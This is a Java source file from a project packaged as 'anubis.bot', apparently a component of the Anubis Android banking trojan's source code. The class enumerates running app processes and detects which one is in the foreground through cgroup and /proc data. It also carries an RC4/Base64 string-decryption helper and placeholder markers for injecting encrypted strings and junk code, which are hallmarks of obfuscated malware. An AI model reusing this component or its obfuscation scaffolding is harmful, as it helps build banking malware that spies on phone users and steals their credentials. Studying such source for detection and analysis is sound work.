package anubis.bot.myapplication.API.ProcessesSDK6;

import android.os.Build;
import android.os.Parcel;
import android.os.Parcelable;
import android.util.Base64;

import java.io.File;
import java.io.IOException;
import java.util.regex.Pattern;

import anubis.bot.myapplication.API.ClassRC4;
import anubis.bot.myapplication.UtilsClass;

public class classProcAndroidAppProcess extends classProcAndroidProcess {
  public String str_decrypt(String textDE_C, String key)
  {
    UtilsClass utilsClass = new UtilsClass();
    try
    {
      byte[] data = Base64.decode(textDE_C, Base64.DEFAULT);
      textDE_C = new String(data, "UTF-8");
      byte[] detext = utilsClass.hexStringToByteArray(textDE_C);
      ClassRC4 rcd = new ClassRC4(key.getBytes());
      return  new String(rcd.decrypt(detext));
    }catch (Exception ex){ }
    return "";
  }

  UtilsClass SF = new UtilsClass();
  private final boolean SYS_SUPPORTS_SCHEDGROUPS = new File("/dev/cpuctl/tasks").exists();//!!!!!!!!!!!!!!!!!!
  private final Pattern PROCESS_NAME_PATTERN = Pattern.compile("^([A-Za-z]{1}[A-Za-z0-9_]*[\\.|:])*[A-Za-z][A-Za-z0-9_]*$");//!!!!!!!

  //[@@@fuctionsCryptText@@@]


  public final boolean foreground;

  public final int uid;

  public classProcAndroidAppProcess(int pid) throws IOException, NotAndroidAppProcessException {
    super(pid);
    if (name == null || !PROCESS_NAME_PATTERN.matcher(name).matches() ||
        !new File("/data/data", getPackName()).exists()) {
      throw new NotAndroidAppProcessException(pid);
    }

    final boolean foreground;
    int uid;

    if (SYS_SUPPORTS_SCHEDGROUPS) {
      classProcCgroup cgroup = cgroup();
      classProcControlGroup cpuacct = cgroup.getGroup("cpuacct");
      classProcControlGroup cpu = cgroup.getGroup("cpu");
      if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
        if (cpu == null || cpuacct == null || !cpuacct.group.contains("pid_")) {
          throw new NotAndroidAppProcessException(pid);
        }
        foreground = !cpu.group.contains("bg_non_interactive");
        try {
          uid = Integer.parseInt(cpuacct.group.split("/")[1].replace("uid_", ""));
        } catch (Exception e) {
          uid = status().getUid();
        }
      } else {
        if (cpu == null || cpuacct == null || !cpu.group.contains("apps")) {
          throw new NotAndroidAppProcessException(pid);
        }
        foreground = !cpu.group.contains("bg_non_interactive");
        try {
          uid = Integer.parseInt(cpuacct.group.substring(cpuacct.group.lastIndexOf("/") + 1));
        } catch (Exception e) {
          uid = status().getUid();
        }

      }
    } else {
      classProcStat stat = stat();
      classProcSTATUS status = status();
      foreground = stat.policy() == 0;
      uid = status.getUid();
    }

    this.foreground = foreground;
    this.uid = uid;
  }

  protected classProcAndroidAppProcess(Parcel in) {
    super(in);
    foreground = in.readByte() != 0x00;
    uid = in.readInt();
  }

  //MINImusor3
  public String getPackName()
  {
    return name.split(":")[0];
  }
  //VVmusor1

  @Override
  public void writeToParcel(Parcel dest, int flags) {
    super.writeToParcel(dest, flags);
    dest.writeByte((byte) (foreground ? 0x01 : 0x00));
    dest.writeInt(uid);
  }
  //VVmusor2
  public static final Parcelable.Creator<classProcAndroidAppProcess> CREATOR = new Parcelable.Creator<classProcAndroidAppProcess>() {

    @Override
    public classProcAndroidAppProcess createFromParcel(Parcel source) {
      return new classProcAndroidAppProcess(source);
    }

    @Override
    public classProcAndroidAppProcess[] newArray(int GGFS) {
      return new classProcAndroidAppProcess[GGFS];
    }
  };

  public static final class NotAndroidAppProcessException extends Exception {

    public NotAndroidAppProcessException(int pid) {
      super(Integer.toString(pid));//!!!!!!!!!!!!!
    }
  }
}
